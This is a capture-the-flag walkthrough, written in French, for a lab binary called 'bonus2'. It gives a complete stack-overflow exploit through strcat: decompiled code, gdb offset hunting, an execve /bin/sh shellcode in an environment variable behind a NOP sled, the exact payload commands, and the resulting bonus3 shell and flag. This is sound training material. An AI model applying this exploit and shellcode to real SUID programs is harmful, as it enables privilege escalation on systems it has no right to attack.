# Bonus2 - Walkthrough

## Objectif
Injecter un **shellcode dans la variable d'environnement `LANG`** et exploiter un overflow dans `greetuser()` via `strcat` pour écraser EIP avec une adresse dans le NOP sled.

**Technique** : Stack Buffer Overflow via strcat + Shellcode dans variable d'environnement

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
# ⚠️ Bit SUID actif → s'exécute avec les droits de bonus3

./bonus2 bla bla
# Hello bla
```

### 2. Analyse du code (Ghidra)

```cpp
void greetuser(char *param_1) {
    char buffer[64];
    
    if (lang == 1)        strncpy(buffer, "Hyvää päivää ", 14);   // fi : 14 bytes
    else if (lang == 2)   strncpy(buffer, "Goedemiddag! ", 13);   // nl : 13 bytes
    else                  strncpy(buffer, "Hello ", 6);            // défaut : 6 bytes
    
    strcat(buffer, param_1);  // ⚠️ Pas de limite ! Overflow si param_1 trop long
    puts(buffer);
}

int main(int argc, char **argv) {
    char combined[76];               // 40 + 32 + null + padding
    
    char *env_lang = getenv("LANG");
    if (env_lang) {
        if (strcmp(env_lang, "fi") == 0) lang = 1;
        else if (strcmp(env_lang, "nl") == 0) lang = 2;
    }
    
    memset(combined, 0, 76);
    strncpy(combined, argv[1], 40);      // Max 40 bytes de argv[1]
    strncpy(combined + 40, argv[2], 32); // Max 32 bytes de argv[2] à l'offset 40
    
    greetuser(combined);
    return 0;
}
```

**Vulnérabilité** : `strcat(buffer, param_1)` dans `greetuser()` sans vérification — si `param_1` est suffisamment long, on déborde `buffer[64]`.

### 3. Trouver l'offset EIP selon LANG

**Sans LANG** (prefix "Hello " = 6 bytes) :
```bash
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3...
eip = 0x08006241  # Pas suffisant pour atteindre EIP
```

**Avec LANG=fi** (prefix "Hyvää päivää " = 14 bytes) :
```bash
export LANG=fi
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3...
eip = 0x41366141  # offset = 18
```

**Avec LANG=nl** (prefix "Goedemiddag! " = 13 bytes) :
```bash
export LANG=nl
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3...
eip = 0x38614137  # offset = 23
```

→ **LANG=nl** : offset EIP = **23** bytes dans argv[2]
→ **LANG=fi** : offset EIP = **18** bytes dans argv[2]

### 4. Injecter le shellcode dans une variable d'environnement

**Pourquoi pas dans LANG directement ?**

Si on met le shellcode dans LANG :
```bash
export LANG=$(python -c 'print "nl" + "\x90"*100 + shellcode')
```
Le programme fait `strcmp(env_lang, "nl")` → `"nl\x90..." != "nl"` → `lang` reste 0 → préfixe "Hello " (6 bytes) → **offset EIP change et on ne peut plus atteindre EIP**.

**Solution** : mettre le shellcode dans une variable séparée et garder `LANG=nl` pur.

```bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
export LANG=nl
```

**Shellcode** (21 bytes) : `execve("/bin/sh", NULL, NULL)`
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

### 5. Trouver l'adresse du NOP sled avec GDB

**Pourquoi main+130 ?**

On désassemble main pour trouver l'appel à `getenv` :
```bash
(gdb) disass main
# 0x080485a6 <+125>: call getenv
# 0x080485ab <+130>: mov %eax,...  ← juste après getenv
```

On met le breakpoint à `main+130` — juste après `getenv` — pour que les variables d'environnement soient chargées et inspectables en mémoire.

```bash
(gdb) b *main+130
(gdb) run $(python -c 'print "A"*40') bla
(gdb) x/20s *((char**)environ)
```

Cette commande affiche toutes les variables d'environnement avec leurs adresses. On repère `SHELLCODE` :

```
0xbffff88f : "SHELLCODE=\x90\x90...[shellcode]"
              ↑
              "SHELLCODE=" = 10 bytes → NOP sled commence à 0xbffff88f + 10 = 0xbffff899
```

**Calcul de l'adresse cible** :
```
NOP sled commence à : 0xbffff899
NOP sled finit à    : 0xbffff899 + 100 = 0xbffff8fd
On vise le milieu   : 0xbffff899 + 50  = 0xbffff8cb  ← adresse cible
```

### 6. Construction du payload

**Avec LANG=nl (offset=23)** :
```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xcb\xf8\xff\xbf"')
```

**Avec LANG=fi (offset=18)** :
```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xcb\xf8\xff\xbf"')
```

### 7. Exploitation

```bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
export LANG=nl
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xcb\xf8\xff\xbf"')
```

**Résultat** :
```bash
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

## Déroulement de l'attaque

```
1. export SHELLCODE = NOP*100 + shellcode
   export LANG = "nl"
   → strcmp("nl", "nl") = 0 → lang = 2 ✅ → préfixe "Goedemiddag! " (13B)

2. main() :
   combined[0..39]  = "A"*40  (argv[1])
   combined[40..62] = "B"*23 + 0xbffff8cb  (argv[2])

3. greetuser(combined) :
   buffer = "Goedemiddag! " (13B)
   strcat(buffer, combined) :
   buffer = "Goedemiddag! " + "A"*40 + "B"*23 + addr
   Total = 13 + 40 + 23 + 4 = 80 bytes dans buffer[64]
   → Déborde ! EIP = 0xbffff8cb ✅

4. ret → 0xbffff8cb → NOP sled dans SHELLCODE → shellcode → /bin/sh 🎉
```

---

## Flag
```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Type de vulnérabilité
- Stack-based Buffer Overflow via strcat (CWE-121)
- Shellcode dans variable d'environnement
- NOP sled technique
- Offset variable selon langue
- SUID privilege escalation (CWE-250)